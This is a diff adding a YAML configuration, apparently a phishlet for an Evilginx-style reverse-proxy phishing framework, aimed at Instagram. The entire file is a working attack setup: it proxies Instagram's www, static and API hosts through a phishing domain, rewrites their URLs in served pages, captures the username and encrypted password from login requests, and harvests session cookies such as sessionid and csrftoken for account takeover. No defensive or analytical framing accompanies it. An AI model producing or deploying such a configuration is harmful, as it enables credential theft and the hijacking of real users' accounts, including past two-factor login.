@@ -1,0 +1,63 @@
+name: "Instagram"
+author: "PhantomGate"
+min_ver: "1.0.0"
+
+proxy_hosts:
+  - phish_sub: "www"
+    orig_sub: "www.instagram.com"
+    domain: "instagram.com"
+    session: true
+    is_ssl: true
+  - phish_sub: "static"
+    orig_sub: "static.cdninstagram.com"
+    domain: "cdninstagram.com"
+    session: false
+    is_ssl: true
+  - phish_sub: "api"
+    orig_sub: "i.instagram.com"
+    domain: "instagram.com"
+    session: false
+    is_ssl: true
+
+sub_filters:
+  - triggers_on: "www.instagram.com"
+    orig_sub: "www"
+    domain: "instagram.com"
+    search: "www.instagram.com"
+    replace: "www.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+  - triggers_on: "www.instagram.com"
+    orig_sub: "www"
+    domain: "instagram.com"
+    search: "static.cdninstagram.com"
+    replace: "static.{phish_domain}"
+    mimes: ["text/html", "application/javascript"]
+  - triggers_on: "www.instagram.com"
+    orig_sub: "www"
+    domain: "instagram.com"
+    search: "i.instagram.com"
+    replace: "api.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+
+credentials:
+  username:
+    key: "username"
+    search: ""
+    type: "json"
+  password:
+    key: "enc_password"
+    search: "#PWD_INSTAGRAM"
+    type: "json"
+
+auth_tokens:
+  - domain: ".instagram.com"
+    keys:
+      - "sessionid"
+      - "csrftoken"
+      - "ds_user_id"
+      - "rur"
+      - "mid"
+
+landing_path:
+  - "/"
+  - "/accounts/login/"
